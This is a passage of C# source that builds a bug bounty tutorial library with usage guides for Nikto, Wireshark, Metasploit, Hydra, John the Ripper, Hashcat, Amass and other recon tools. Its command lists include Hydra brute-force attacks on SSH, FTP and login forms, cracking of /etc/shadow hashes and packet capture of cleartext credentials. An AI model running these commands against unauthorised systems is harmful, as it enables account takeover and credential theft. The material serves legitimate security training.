                Content = "Nikto is an open-source web server scanner that performs comprehensive tests against web servers for multiple items. It checks for over 6700 potentially dangerous files/programs, outdated versions of over 1250 servers, and version-specific problems.\n\nWhat Nikto Finds: Dangerous files, outdated software, potentially dangerous CGIs, misconfigured files, default credentials, insecure cookies, missing security headers, information disclosure.\n\nNikto Limitations: Nikto is noisy - it sends thousands of requests and will be detected. It generates many false positives. It's not updated as frequently as other tools. Consider it a supplementary tool, not primary.\n\nNikto Uses in Bug Bounty: Quick initial assessment of web servers, finding obvious misconfigurations, discovering outdated software versions, checking for common vulnerabilities.\n\nNikto Plugins: Nikto supports plugins for extended functionality. The -Plugins option lists and selects plugins to run.\n\nOutput Formats: Nikto can output to various formats: CSV, HTML, NBE, SQL, TXT, XML. Use XML for importing into other tools.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "nikto -h https://target.com", Explanation = "Basic Nikto scan of target web server." },
                    new CommandItem { Text = "nikto -h https://target.com -port 8080", Explanation = "Scan non-standard port." },
                    new CommandItem { Text = "nikto -h https://target.com -o output.html -Format htm", Explanation = "Save output as HTML report." },
                    new CommandItem { Text = "nikto -h https://target.com -C all", Explanation = "Check all CGI directories." },
                    new CommandItem { Text = "nikto -h target.com -ssl", Explanation = "Force SSL/HTTPS connection." },
                    new CommandItem { Text = "nikto -h https://target.com -Plugins headers", Explanation = "Run only headers plugin to check security headers." },
                    new CommandItem { Text = "nikto -h https://target.com -T 08", Explanation = "Only test specific categories (0=file, 8=database)." },
                    new CommandItem { Text = "nikto -h https://target.com -useproxy http://127.0.0.1:8080", Explanation = "Route Nikto through Burp Suite proxy." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Run basic Nikto scan on each in-scope web server", Code = "nikto -h https://target.com" },
                    new StepItem { Number = 2, Description = "Save output for later review", Code = "nikto -h target.com -o nikto_output.txt" },
                    new StepItem { Number = 3, Description = "Review findings and prioritize interesting ones", Code = "grep -i 'interesting\\|vuln\\|outdated' nikto_output.txt" },
                    new StepItem { Number = 4, Description = "Verify false positives manually", Code = "Test each finding with curl or Burp" }
                },
                Tools = new List<string> { "Nikto", "WAScan", "OWASP ZAP", "Wapiti" }
            };

            libraryTopics["Tool_Wireshark"] = new LibraryTopic
            {
                Tag = "Tool_Wireshark",
                Category = "Essential Tools",
                Title = "Wireshark - Packet Analysis",
                Subtitle = "Network Packet Capture and Analysis",
                Content = "Wireshark is the world's most popular network protocol analyzer. It captures network packets and displays them in human-readable format. For bug bounty hunters, it's invaluable for understanding application traffic, finding sensitive data in transit, and debugging network issues.\n\nWireshark Interface: Packet list (top), packet details (middle), packet bytes (bottom). Filters can be applied in the filter bar.\n\nCapture Filters: Applied before capturing to limit traffic. Examples: 'host 192.168.1.1', 'port 80', 'tcp and host 10.0.0.1'.\n\nDisplay Filters: Applied after capture to show/hide packets. More powerful than capture filters. Examples: 'http.request.method == GET', 'dns.qry.name contains target.com', 'tls.handshake'.\n\nWireshark for Bug Hunting: Capture application traffic to find cleartext credentials, understand how authentication works, identify all endpoints an application communicates with, find sensitive data not protected by HTTPS.\n\nHTTP Analysis: Filter with 'http' to see all HTTP requests and responses. Follow HTTP streams to see complete conversations.\n\nTLS Analysis: While you can't decrypt TLS without the key, you can see metadata like server names, certificate details, and patterns.\n\nTcpdump: Command-line alternative to Wireshark. Captures to .pcap file format that Wireshark can read. Useful on systems without GUI.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "wireshark &", Explanation = "Launch Wireshark GUI in background." },
                    new CommandItem { Text = "sudo tcpdump -i eth0 -w capture.pcap", Explanation = "Capture all traffic on eth0 and save to file." },
                    new CommandItem { Text = "sudo tcpdump -i eth0 host target.com -w target.pcap", Explanation = "Capture only traffic to/from specific host." },
                    new CommandItem { Text = "sudo tcpdump -i eth0 port 80 -A", Explanation = "Capture HTTP traffic and print as ASCII text. May show sensitive data." },
                    new CommandItem { Text = "sudo tcpdump -i eth0 'tcp and port 443'", Explanation = "Capture only HTTPS traffic." },
                    new CommandItem { Text = "tshark -r capture.pcap -Y 'http.request.method == POST'", Explanation = "Filter POST requests from saved capture file using tshark (CLI Wireshark)." },
                    new CommandItem { Text = "tshark -r capture.pcap -T fields -e http.request.uri", Explanation = "Extract specific fields from capture. Here: all requested URIs." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Start packet capture on correct interface", Code = "sudo tcpdump -i eth0 -w capture.pcap" },
                    new StepItem { Number = 2, Description = "Perform the action you want to capture", Code = "Browse application, login, make requests" },
                    new StepItem { Number = 3, Description = "Stop capture and open in Wireshark", Code = "wireshark capture.pcap" },
                    new StepItem { Number = 4, Description = "Apply display filter", Code = "http or dns or ssl" },
                    new StepItem { Number = 5, Description = "Follow streams to see complete conversations", Code = "Right-click > Follow > TCP Stream" }
                },
                Tools = new List<string> { "Wireshark", "tcpdump", "tshark", "NetworkMiner", "Zeek" }
            };

            libraryTopics["Tool_Metasploit"] = new LibraryTopic
            {
                Tag = "Tool_Metasploit",
                Category = "Essential Tools",
                Title = "Metasploit Framework Guide",
                Subtitle = "Exploitation Framework for Security Testing",
                Content = "Metasploit is the world's most used penetration testing framework. It provides a vast library of exploits, payloads, and auxiliary modules for security testing. While primarily used in network penetration testing, some modules are relevant for web bug bounty.\n\nMetasploit Components:\nmsfconsole: Command-line interface to Metasploit\nmsfvenom: Payload generator\nArmitage: GUI for Metasploit\nDatabase: PostgreSQL stores scan results and loot\n\nModule Types:\nExploits: Leverage vulnerabilities to gain access\nAuxiliary: Scanning, fuzzing, enumeration\nPayloads: Code executed after exploit (meterpreter, shell)\nPost: Post-exploitation modules\nEncoders: Payload encoding to evade detection\nNops: No-operation instruction generators\n\nMetasploit in Bug Bounty: Primarily use auxiliary modules for scanning and testing. Common uses: vulnerability confirmation, service version detection, credential testing.\n\nSearching Modules: Use 'search' command to find relevant modules. Filter by type, CVE, platform, or keyword.\n\nMeterpreter: Advanced payload with many features: file upload/download, shell, screenshot, keylogging, privilege escalation helpers.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "msfconsole", Explanation = "Launch Metasploit console." },
                    new CommandItem { Text = "search type:auxiliary target_service", Explanation = "Search for auxiliary modules for specific service." },
                    new CommandItem { Text = "use auxiliary/scanner/http/http_version", Explanation = "Use a module. Tab completion works for module paths." },
                    new CommandItem { Text = "show options", Explanation = "Show configurable options for selected module." },
                    new CommandItem { Text = "set RHOSTS target.com", Explanation = "Set target host(s). Accepts IPs, hostnames, ranges, CIDR." },
                    new CommandItem { Text = "set RPORT 8080", Explanation = "Set target port." },
                    new CommandItem { Text = "run", Explanation = "Execute the current module. Also works as 'exploit'." },
                    new CommandItem { Text = "search cve:2021 type:exploit", Explanation = "Search for exploits by CVE year." },
                    new CommandItem { Text = "db_nmap -sV -p- target.com", Explanation = "Run nmap from within Metasploit and save to database." },
                    new CommandItem { Text = "hosts", Explanation = "List all hosts discovered and stored in database." },
                    new CommandItem { Text = "vulns", Explanation = "List vulnerabilities found and stored in database." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Start PostgreSQL database", Code = "sudo systemctl start postgresql" },
                    new StepItem { Number = 2, Description = "Initialize Metasploit database", Code = "msfdb init" },
                    new StepItem { Number = 3, Description = "Launch msfconsole", Code = "msfconsole" },
                    new StepItem { Number = 4, Description = "Verify database connection", Code = "db_status" },
                    new StepItem { Number = 5, Description = "Import nmap results", Code = "db_import nmap.xml" },
                    new StepItem { Number = 6, Description = "Search for relevant modules", Code = "search type:auxiliary apache" },
                    new StepItem { Number = 7, Description = "Configure and run module", Code = "use module; set RHOSTS target.com; run" }
                },
                Tools = new List<string> { "Metasploit", "msfconsole", "msfvenom", "Armitage", "Cobalt Strike" }
            };

            libraryTopics["Tool_Dirb"] = new LibraryTopic
            {
                Tag = "Tool_Dirb",
                Category = "Essential Tools",
                Title = "Dirb and Dirbuster Tutorial",
                Subtitle = "Web Content Discovery Tools",
                Content = "Dirb and Dirbuster are web content discovery tools that brute force directories and files on web servers. While older than FFUF and Gobuster, they remain useful and are installed by default in Kali Linux.\n\nDirb: Simple command-line tool. Good for quick scans. Limited features but easy to use. Supports cookies, authentication, and proxy.\n\nDirbuster: Java-based GUI tool. More powerful than Dirb. Supports multiple threads, custom wordlists, and recursion.\n\nBetter Alternatives: FFUF and Gobuster are generally faster and more feature-rich. However, knowing Dirb is still useful for situations where only pre-installed tools are available.\n\nWordlist Selection: The quality of your wordlist is more important than the tool itself. Use SecLists for best results.\n\nRecursion: Both tools can recursively scan discovered directories. This exponentially increases scan time but finds more content.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "dirb https://target.com", Explanation = "Basic Dirb scan using default wordlist." },
                    new CommandItem { Text = "dirb https://target.com /usr/share/wordlists/dirb/big.txt", Explanation = "Dirb with larger wordlist." },
                    new CommandItem { Text = "dirb https://target.com -X .php,.html,.js", Explanation = "Search for files with specific extensions." },
                    new CommandItem { Text = "dirb https://target.com -c 'session=abc123'", Explanation = "Include cookies for authenticated scanning." },
                    new CommandItem { Text = "dirb https://target.com -p http://127.0.0.1:8080", Explanation = "Route through Burp Suite proxy." },
                    new CommandItem { Text = "dirb https://target.com -o output.txt", Explanation = "Save results to output file." },
                    new CommandItem { Text = "dirb https://target.com -N 404", Explanation = "Ignore responses with specific status code." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Run basic Dirb scan", Code = "dirb https://target.com" },
                    new StepItem { Number = 2, Description = "Try larger wordlist", Code = "dirb https://target.com /usr/share/wordlists/dirb/big.txt" },
                    new StepItem { Number = 3, Description = "Add common extensions", Code = "dirb https://target.com -X .php,.html,.txt" },
                    new StepItem { Number = 4, Description = "Investigate interesting findings", Code = "curl or browse to interesting URLs" }
                },
                Tools = new List<string> { "Dirb", "Dirbuster", "Gobuster", "FFUF", "Feroxbuster" }
            };

            libraryTopics["Tool_Hydra"] = new LibraryTopic
            {
                Tag = "Tool_Hydra",
                Category = "Essential Tools",
                Title = "Hydra - Password Attacks",
                Subtitle = "Online Password Cracking and Brute Force",
                Content = "Hydra is a fast and flexible online password cracking tool that supports numerous protocols. It can perform brute force and dictionary attacks against authentication services.\n\nSupported Protocols: HTTP (GET/POST/FORM), HTTPS, FTP, SSH, Telnet, SMB, MySQL, PostgreSQL, SMTP, POP3, IMAP, LDAP, RDP, VNC, and many more.\n\nDictionary vs Brute Force: Dictionary attacks use wordlists of common passwords (faster, usually more effective). Brute force tries all possible combinations (slow but thorough for short passwords).\n\nWordlists: SecLists has excellent password lists. rockyou.txt is the most commonly used. fasttrack.txt has commonly used passwords.\n\nRespect Rate Limits: Bug bounty programs prohibit aggressive brute forcing. Always use rate limiting (-t threads, -W wait) to avoid locking accounts or causing service disruption.\n\nBug Bounty Usage: Hydra is mainly used for testing default credentials on discovered services. Check for admin/admin, root/root, and other common defaults.\n\nHTTP Form Testing: The most common bug bounty use case. Testing login forms for weak credentials or account lockout issues.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "hydra -l admin -P passwords.txt target.com ssh", Explanation = "Test SSH with username 'admin' and password wordlist." },
                    new CommandItem { Text = "hydra -L users.txt -P passwords.txt target.com ftp", Explanation = "Test FTP with username and password wordlists." },
                    new CommandItem { Text = "hydra -l admin -P passwords.txt target.com http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'", Explanation = "Brute force HTTP POST login form." },
                    new CommandItem { Text = "hydra -l admin -P passwords.txt target.com http-get /admin", Explanation = "Brute force HTTP Basic Authentication." },
                    new CommandItem { Text = "hydra -l root -p '' target.com mysql", Explanation = "Test MySQL for root with no password." },
                    new CommandItem { Text = "hydra -l admin -P passwords.txt -t 10 -W 3 target.com http-post-form '...'", Explanation = "Throttled attack. -t limits threads, -W adds wait time between attempts." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Identify the target service and protocol", Code = "nmap -sV target.com" },
                    new StepItem { Number = 2, Description = "Choose appropriate username and password lists", Code = "ls /usr/share/wordlists/" },
                    new StepItem { Number = 3, Description = "Prepare the Hydra command for the service", Code = "hydra -l user -P passlist.txt target.com service" },
                    new StepItem { Number = 4, Description = "Add throttling to be respectful", Code = "Add -t 4 -W 3 to limit threads and add wait" },
                    new StepItem { Number = 5, Description = "Verify successful credentials manually", Code = "Test found credentials directly" }
                },
                Tools = new List<string> { "Hydra", "Medusa", "Ncrack", "THC-Hydra", "Patator" }
            };

            libraryTopics["Tool_John"] = new LibraryTopic
            {
                Tag = "Tool_John",
                Category = "Essential Tools",
                Title = "John the Ripper Deep Dive",
                Subtitle = "Offline Password Hash Cracking",
                Content = "John the Ripper (JtR) is an offline password cracking tool that cracks password hashes. It's used when you've obtained password hashes from a database or system and need to recover the original passwords.\n\nHow Hash Cracking Works: Password hashing is a one-way function. To crack a hash, JtR tries combinations and hashes them, comparing to the target. If the hashes match, the password is found.\n\nJohn Modes:\nWordlist mode: Try each word from a wordlist\nSingle mode: Tries username, gecos field variants\nIncremental mode: Brute force all combinations\nMask mode: Brute force with known pattern\nExternal mode: Custom algorithm\n\nHash Identification: Before cracking, you need to identify the hash type. Use hash-identifier or hashid tools.\n\nJohn Features: Automatic hash type detection, built-in wordlists, rules for wordlist transformation (adding numbers, special chars, etc.), distributed cracking support.\n\nBug Bounty Usage: If you find a database with password hashes, JtR is used to determine if they're weakly protected. This demonstrates the real-world impact of SQL injection findings.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "john hashes.txt", Explanation = "Basic John crack. Auto-detects hash type and uses single mode." },
                    new CommandItem { Text = "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt", Explanation = "Dictionary attack using rockyou.txt wordlist." },
                    new CommandItem { Text = "john --format=md5 --wordlist=wordlist.txt hashes.txt", Explanation = "Specify hash format explicitly." },
                    new CommandItem { Text = "john --format=bcrypt --wordlist=wordlist.txt hashes.txt", Explanation = "Crack bcrypt hashes (very slow)." },
                    new CommandItem { Text = "john --show hashes.txt", Explanation = "Show already cracked passwords from previous sessions." },
                    new CommandItem { Text = "john --incremental hashes.txt", Explanation = "Brute force all character combinations. Very slow." },
                    new CommandItem { Text = "john --list=formats", Explanation = "List all supported hash formats." },
                    new CommandItem { Text = "hash-identifier", Explanation = "Interactive tool to identify hash type from its format." },
                    new CommandItem { Text = "unshadow /etc/passwd /etc/shadow > combined.txt && john combined.txt", Explanation = "Crack Linux user passwords from /etc/shadow file." }
                },
                Tools = new List<string> { "John the Ripper", "Hashcat", "hash-identifier", "hashid", "JohnTheRipper Jumbo" }
            };

            libraryTopics["Tool_Hashcat"] = new LibraryTopic
            {
                Tag = "Tool_Hashcat",
                Category = "Essential Tools",
                Title = "Hashcat - Password Cracking",
                Subtitle = "GPU-Accelerated Password Recovery",
                Content = "Hashcat is the world's fastest CPU/GPU-based password cracking tool. Unlike John the Ripper which relies on CPU, Hashcat can utilize graphics card (GPU) power for dramatically faster cracking speeds.\n\nHashcat Attack Modes:\n0: Straight (dictionary)\n1: Combination (combine two wordlists)\n3: Brute-force (mask attack)\n6: Hybrid wordlist + mask\n7: Hybrid mask + wordlist\n\nMask Syntax: ?l=lowercase, ?u=uppercase, ?d=digit, ?s=special, ?a=all. Pattern example: ?u?l?l?l?d?d = Password like 'Test12'\n\nRules: Hashcat rules transform wordlist entries. -r rules/best64.rule applies 64 common transformations to each word (add numbers, capitalize, l33t speak, etc.).\n\nHashcat Hash Types: Each hash type has a number. Common: 0=MD5, 100=SHA1, 1000=NTLM, 1800=sha512crypt, 3200=bcrypt, 5500=NetNTLMv1, 5600=NetNTLMv2, 13100=Kerberoast.\n\nGPU Requirements: Hashcat uses OpenCL or CUDA. Requires compatible GPU and drivers. AMD and NVIDIA GPUs both work but setup differs.\n\nBug Bounty Usage: When demonstrating SQL injection impact, crack extracted hashes to show real passwords were recoverable. This significantly increases severity.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "hashcat -m 0 hashes.txt wordlist.txt", Explanation = "MD5 dictionary attack. -m 0 = MD5 hash type." },
                    new CommandItem { Text = "hashcat -m 100 hashes.txt wordlist.txt", Explanation = "SHA1 dictionary attack. -m 100 = SHA1." },
                    new CommandItem { Text = "hashcat -m 1000 hashes.txt wordlist.txt", Explanation = "NTLM dictionary attack. Common in Windows environments." },
                    new CommandItem { Text = "hashcat -m 0 hashes.txt wordlist.txt -r rules/best64.rule", Explanation = "Dictionary attack with rules. Rules transform words (add numbers, symbols, etc.)." },
                    new CommandItem { Text = "hashcat -m 0 hashes.txt -a 3 ?u?l?l?l?d?d?d", Explanation = "Mask attack. Pattern: 1 uppercase, 3 lowercase, 3 digits." },
                    new CommandItem { Text = "hashcat -m 0 hash.txt -a 0 wordlist.txt --show", Explanation = "Show cracked passwords from previous session." },
                    new CommandItem { Text = "hashcat --example-hashes | grep -A 3 'TYPE: MD5'", Explanation = "Show example hashes to verify your hash type detection." },
                    new CommandItem { Text = "hashcat -m 3200 hashes.txt wordlist.txt", Explanation = "Bcrypt cracking. Extremely slow due to bcrypt design. GPUs help significantly." }
                },
                Tools = new List<string> { "Hashcat", "John the Ripper", "Hashid", "Hash-identifier", "CrackStation" }
            };

            libraryTopics["Tool_Amass"] = new LibraryTopic
            {
                Tag = "Tool_Amass",
                Category = "Essential Tools",
                Title = "Amass - Attack Surface Mapping",
                Subtitle = "Comprehensive Subdomain Enumeration and Attack Surface Discovery",
                Content = "Amass is one of the most powerful tools for in-depth attack surface mapping and subdomain enumeration. It performs DNS enumeration, web scraping, API integration, and certificate transparency log analysis to discover the full scope of a target's internet-facing assets.\n\nAmass Sub-commands:\nenum: Enumerate subdomains\ndb: Interact with data stored in the graph database\nviz: Generate visualizations\ntrack: Track differences between enumerations\n\nAmass Data Sources: DNS, Certificate Transparency, Search Engines, APIs (VirusTotal, Shodan, Censys, PassiveTotal, etc.), Web Archives, CommonCrawl.\n\nPassive vs Active Enumeration: Passive mode doesn't send direct DNS queries to target - safer and stealthier. Active mode sends DNS queries directly - more thorough but potentially detectable.\n\nAPI Keys: Amass integrates with many commercial services. Adding API keys (VirusTotal, Shodan, Censys) dramatically improves results. Configure in ~/.config/amass/config.ini.\n\nAmass Output: Amass produces comprehensive output that can be fed into other tools. Output includes subdomains, IP addresses, ASNs, and relationships between entities.\n\nAmass vs Other Tools: Amass is slower but more thorough than Subfinder. For quick results use Subfinder, for comprehensive results use Amass. Running both gives best coverage.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "amass enum -d target.com", Explanation = "Basic passive subdomain enumeration." },
                    new CommandItem { Text = "amass enum -active -d target.com", Explanation = "Active enumeration - sends DNS queries directly. More thorough." },
                    new CommandItem { Text = "amass enum -d target.com -o subdomains.txt", Explanation = "Save discovered subdomains to file." },
                    new CommandItem { Text = "amass enum -d target.com -src", Explanation = "Show data source for each discovered subdomain." },
                    new CommandItem { Text = "amass enum -d target.com -ip", Explanation = "Include IP addresses for discovered subdomains." },
                    new CommandItem { Text = "amass enum -d target.com -config ~/.config/amass/config.ini", Explanation = "Use configuration file with API keys for better results." },
                    new CommandItem { Text = "amass db -names -d target.com", Explanation = "Query Amass database for previously discovered names." },
                    new CommandItem { Text = "amass viz -d target.com -dot", Explanation = "Generate DOT format graph for visualization." },
                    new CommandItem { Text = "amass intel -org 'Target Company Name'", Explanation = "Find domains owned by a specific organization." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Install Amass", Code = "sudo snap install amass" },
                    new StepItem { Number = 2, Description = "Configure API keys for better results", Code = "nano ~/.config/amass/config.ini" },
                    new StepItem { Number = 3, Description = "Run passive enumeration", Code = "amass enum -passive -d target.com -o passive_subs.txt" },
                    new StepItem { Number = 4, Description = "Run active enumeration", Code = "amass enum -active -d target.com -o active_subs.txt" },
                    new StepItem { Number = 5, Description = "Combine and deduplicate results", Code = "cat passive_subs.txt active_subs.txt | sort -u > all_subs.txt" }
                },
                Tools = new List<string> { "Amass", "Subfinder", "Assetfinder", "Findomain", "Crobat" }
            };

            libraryTopics["Tool_Sublist3r"] = new LibraryTopic
            {
                Tag = "Tool_Sublist3r",
                Category = "Essential Tools",
                Title = "Sublist3r Complete Guide",
                Subtitle = "Fast Subdomain Enumeration Tool",
                Content = "Sublist3r is a Python tool designed to enumerate subdomains using OSINT (Open Source Intelligence). It searches multiple search engines and public APIs to discover subdomains without directly querying target DNS.\n\nSublist3r Data Sources: Google, Bing, Yahoo, Baidu, Ask, DNSdumpster, VirusTotal, ThreatCrowd, SSL Certificates (crt.sh), PasiveDNS.\n\nStrengths and Weaknesses: Sublist3r is quick and covers many sources. However, it's slower than Subfinder and lacks some advanced features. For best results, use alongside Subfinder and Amass.\n\nBruteForce Option: Sublist3r includes a basic brute force option using a wordlist. Less comprehensive than dedicated DNS brute force tools but convenient.\n\nSublist3r Installation: Not always installed by default in newer Kali versions. Install with pip or clone from GitHub.\n\nModern Alternatives: Subfinder by ProjectDiscovery is faster and has more data sources. However, Sublist3r remains widely used in the community.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "sublist3r -d target.com", Explanation = "Basic subdomain enumeration using all available sources." },
                    new CommandItem { Text = "sublist3r -d target.com -o output.txt", Explanation = "Save results to output file." },
                    new CommandItem { Text = "sublist3r -d target.com -b -w wordlist.txt", Explanation = "Enable brute force with custom wordlist." },
                    new CommandItem { Text = "sublist3r -d target.com -t 10", Explanation = "Use 10 threads for faster enumeration." },
                    new CommandItem { Text = "sublist3r -d target.com -v", Explanation = "Verbose output showing progress." },
                    new CommandItem { Text = "sublist3r -d target.com -e google,bing", Explanation = "Use only specific search engines." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Install Sublist3r if not present", Code = "pip3 install sublist3r" },
                    new StepItem { Number = 2, Description = "Run basic enumeration", Code = "sublist3r -d target.com -o sublist3r_results.txt" },
                    new StepItem { Number = 3, Description = "Combine with other tools' results", Code = "cat sublist3r_results.txt subfinder_results.txt | sort -u > combined.txt" }
                },
                Tools = new List<string> { "Sublist3r", "Subfinder", "Amass", "Assetfinder" }
            };

            libraryTopics["Tool_WhatWeb"] = new LibraryTopic
            {
                Tag = "Tool_WhatWeb",
                Category = "Essential Tools",
                Title = "WhatWeb - Technology Detection",
                Subtitle = "Identify Web Technologies and Fingerprint Servers",
                Content = "WhatWeb identifies technologies used by websites. It can recognize web frameworks, CMS platforms, web servers, JavaScript libraries, analytics tools, and many other technologies. Knowing what technology stack a target uses helps you focus on relevant vulnerabilities.\n\nWhat WhatWeb Detects: CMS (WordPress, Joomla, Drupal), web servers (Apache, Nginx, IIS), programming languages (PHP, ASP, Python), JavaScript frameworks (jQuery, React, Angular), analytics tools, CDN providers, hosting providers, and much more.\n\nAggression Levels: Level 1 - Stealthy, no additional requests. Level 2 - Slightly more aggressive. Level 3 - Aggressive, multiple requests. Level 4 - Heavy, follows redirects. Level 5 - Very heavy, many requests. Use level 1-2 for normal bug bounty testing.\n\nPlugins: WhatWeb has over 1800 plugins. Each plugin detects a specific technology. Custom plugins can be written.\n\nOutput Formats: JSON, XML, CSV, Log format. Use JSON for parsing with other tools.\n\nWappalyzer Alternative: Wappalyzer browser extension is an excellent complement. It detects technologies in real-time as you browse.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "whatweb https://target.com", Explanation = "Basic technology detection for a single URL." },
                    new CommandItem { Text = "whatweb -a 3 https://target.com", Explanation = "Aggressive scan level 3 for more detailed results." },
                    new CommandItem { Text = "whatweb -a 1 -i urls.txt --log-json output.json", Explanation = "Scan list of URLs and save as JSON." },
                    new CommandItem { Text = "whatweb --log-json=results.json https://target.com", Explanation = "Save results in JSON format for later processing." },
                    new CommandItem { Text = "cat subdomains.txt | xargs -I{} whatweb {}", Explanation = "Scan multiple subdomains from file." },
                    new CommandItem { Text = "whatweb https://target.com --color=never", Explanation = "Output without color codes. Useful for saving to files." }
                },
                Tools = new List<string> { "WhatWeb", "Wappalyzer", "BuiltWith", "Retire.js", "Observatory" }
            };

            libraryTopics["Tool_Aquatone"] = new LibraryTopic
            {
                Tag = "Tool_Aquatone",
                Category = "Essential Tools",
                Title = "Aquatone - Screenshot Tool",
                Subtitle = "Visual Website Discovery and Reporting",
                Content = "Aquatone takes screenshots of websites and creates an HTML report with all screenshots. When you discover hundreds of subdomains, manually browsing each is impractical. Aquatone automates this process and gives you a visual overview.\n\nAquatone Workflow: Input a list of hosts or URLs, Aquatone visits each one, takes a screenshot, captures headers, and generates an HTML report. The report shows all screenshots in a grid view.\n\nAquatone Capabilities: HTTP and HTTPS support, port scanning, technology detection, screenshot capture, HTML report generation.\n\nWhy Screenshots Matter: Visual review allows you to quickly identify: admin panels, login forms, development environments, misconfigured services, default pages, internal tools.\n\nIntegration: Aquatone integrates well with subdomain enumeration tools. Pipe subfinder/amass output directly to Aquatone.\n\nAlternatives: EyeWitness is another excellent screenshot tool. GoWitness is a modern Go-based alternative. Httpx can also capture screenshots.\n\nReport Usage: The HTML report is useful for: team collaboration, sharing findings, prioritizing targets for manual testing, documentation.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "cat subdomains.txt | aquatone -out ./screenshots/", Explanation = "Take screenshots of all subdomains in file. Output to screenshots directory." },
                    new CommandItem { Text = "cat hosts.txt | aquatone -ports 80,443,8080,8443", Explanation = "Specify which ports to check on each host." },
                    new CommandItem { Text = "cat hosts.txt | aquatone -threads 10 -out ./output/", Explanation = "Use 10 concurrent threads for faster processing." },
                    new CommandItem { Text = "cat hosts.txt | aquatone -chrome-path /usr/bin/chromium", Explanation = "Specify Chrome/Chromium browser path." },
                    new CommandItem { Text = "cat hosts.txt | aquatone -scan-timeout 300", Explanation = "Set timeout for each scan in milliseconds." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Install Aquatone", Code = "go install github.com/michenriksen/aquatone@latest" },
                    new StepItem { Number = 2, Description = "Run subdomain enumeration", Code = "subfinder -d target.com | tee subdomains.txt" },
                    new StepItem { Number = 3, Description = "Screenshot all subdomains", Code = "cat subdomains.txt | aquatone -out screenshots/" },
                    new StepItem { Number = 4, Description = "Open HTML report", Code = "firefox screenshots/aquatone_report.html" },
                    new StepItem { Number = 5, Description = "Review screenshots and prioritize targets", Code = "Mark interesting targets for manual testing" }
                },
                Tools = new List<string> { "Aquatone", "EyeWitness", "GoWitness", "Httpx", "Chromium" }
            };

            libraryTopics["Tool_Httpx"] = new LibraryTopic
            {
                Tag = "Tool_Httpx",
                Category = "Essential Tools",
                Title = "Httpx - Probe Tool Guide",
                Subtitle = "Fast HTTP Probing and Analysis",
                Content = "Httpx is a fast and multi-purpose HTTP toolkit that runs multiple probers using the retryablehttp library. It's developed by ProjectDiscovery and is a core tool in modern bug bounty workflows.\n\nKey Features: Live host detection, status codes, response sizes, titles, redirect following, technology detection, screenshot capture, custom headers.\n\nHttpx Use Cases: Filter live subdomains from large lists, collect response metadata, detect technologies, discover login pages, find interesting pages through title search.\n\nIntegration: Httpx is designed to work in pipelines. Input from subfinder, output to other tools. JSON output can be parsed and processed.\n\nFiltering and Matching: Match status codes, filter by response size, match regex patterns in responses, filter by technologies detected.\n\nJSON Output: Httpx's JSON output contains rich metadata: URL, status code, title, content-length, content-type, server, technologies, and more. Useful for programmatic processing.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "cat subdomains.txt | httpx", Explanation = "Basic probe to find live hosts from subdomain list." },
                    new CommandItem { Text = "cat subdomains.txt | httpx -status-code -title", Explanation = "Show status codes and page titles for each live host." },
                    new CommandItem { Text = "cat subdomains.txt | httpx -status-code -mc 200", Explanation = "Match only responses with 200 status code." },
                    new CommandItem { Text = "cat subdomains.txt | httpx -json -o results.json", Explanation = "Output full JSON metadata for each probe." },
                    new CommandItem { Text = "cat subdomains.txt | httpx -tech-detect", Explanation = "Detect technologies used on each live host." },
                    new CommandItem { Text = "cat subdomains.txt | httpx -fr -match-regex 'admin|login|dashboard'", Explanation = "Find pages matching regex patterns in response." },
                    new CommandItem { Text = "echo 'target.com' | httpx -screenshot -o screenshots/", Explanation = "Take screenshots of probed URLs." },
                    new CommandItem { Text = "subfinder -d target.com | httpx -silent | tee live_urls.txt", Explanation = "Complete pipeline from subdomain discovery to live URL list." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Install httpx", Code = "go install github.com/projectdiscovery/httpx/cmd/httpx@latest" },
                    new StepItem { Number = 2, Description = "Probe subdomain list", Code = "cat subdomains.txt | httpx -status-code -title -o live.txt" },
                    new StepItem { Number = 3, Description = "Filter for interesting pages", Code = "cat subdomains.txt | httpx -match-regex 'admin'" },
                    new StepItem { Number = 4, Description = "Get full metadata in JSON", Code = "cat subdomains.txt | httpx -json | jq '.url, .title, .status_code'" }
                },
                Tools = new List<string> { "httpx", "httprobe", "meg", "fff", "curl" }
            };
        }

        
        private void InitializeVulnerabilities()
        {
            libraryTopics["Vuln_SQLi"] = new LibraryTopic
            {
                Tag = "Vuln_SQLi",
                Category = "Vulnerabilities",
                Title = "SQL Injection - Complete Guide",
                Subtitle = "Finding, Exploiting, and Reporting SQL Injection",
